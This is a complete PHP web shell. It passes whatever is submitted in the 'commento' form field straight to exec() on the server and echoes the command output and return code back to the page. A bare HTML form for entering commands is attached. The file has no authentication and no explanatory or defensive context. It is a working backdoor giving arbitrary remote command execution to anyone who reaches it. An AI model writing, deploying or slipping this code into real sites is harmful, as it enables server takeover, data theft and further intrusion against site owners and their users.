<?php
if(isset($_POST['commento']))
{
  exec($_POST['commento'], $output, $return); //--norestore
  if($output)
  {
	echo '<pre>';
	print_r($output);
	echo '<br>';
	print_r($return);
	echo '</pre>';
  }
}
?>

<form action="#" method="POST">
<input type="text" name="commento">
<input type="submit">
</form>
